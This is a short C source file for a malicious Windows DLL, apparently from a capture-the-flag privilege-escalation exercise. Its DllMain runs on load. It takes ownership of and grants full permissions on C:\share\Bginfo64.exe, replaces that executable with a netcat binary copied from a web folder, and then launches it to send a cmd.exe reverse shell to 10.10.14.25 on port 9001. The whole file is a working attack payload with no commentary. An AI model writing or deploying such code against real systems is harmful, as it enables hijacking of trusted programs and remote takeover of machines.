#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
  switch(dwReason)
  {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c takeown /F C:\\share\\Bginfo64.exe");
        system("cmd.exe /c cacls C:\\share\\Bginfo64.exe /E /G ginawild:F");
        system("cmd.exe /c copy C:\\inetpub\\wwwroot\\data\\sites\\1\\media\\nc64.exe C:\\share\\Bginfo64.exe");
        system("cmd.exe /c C:\\share\\Bginfo64.exe -e cmd 10.10.14.25 9001");
      break;
  }
  return TRUE;
}
